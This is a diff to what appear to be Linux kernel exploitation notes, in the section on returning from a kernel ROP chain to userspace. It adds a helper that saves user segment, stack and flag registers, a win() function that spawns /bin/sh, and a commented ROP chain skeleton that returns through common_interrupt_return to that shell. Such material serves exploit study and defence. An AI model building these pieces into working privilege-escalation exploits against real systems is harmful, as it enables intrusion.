@@ -499,16 +499,35 @@ ROP return to userspace
 
 - Process calls helper to save state before exploiting.
     ```c
-    static void save_state() {
-      asm(
-          "movq %%cs, %0\n"
-          "movq %%ss, %1\n"
-          "pushfq\n"
-          "popq %2\n"
-          "movq %%rsp, %3\n"
-          : "=r"(cs), "=r"(ss), "=r"(rflags), "=r"(rsp)
-          :
-          : "memory");
+    unsigned long user_cs, user_ss, user_rsp, user_rflags;
+
+    void win()
+    {
+        system("/bin/sh");
+    }
+
+    void save_state()
+    {
+        __asm__(
+            ".intel_syntax noprefix;"
+            "mov user_cs, cs;"
+            "mov user_ss, ss;"
+            "mov user_rsp, rsp;"
+            "pushf;"
+            "pop user_rflags;"
+            ".att_syntax;"
+        );
+        /*
+        rop[i++] = common_interrupt_return + <offset>; // old name: swapgs_restore_regs_and_return_to_usermode
+        
+        // [...]
+        
+        rop[i++] = (unsigned long)win;
+        rop[i++] = user_cs;
+        rop[i++] = user_rflags;
+        rop[i++] = user_rsp & 0xffffffffffffff00;
+        rop[i++] = user_ss;
+        */
     }
     ```
 
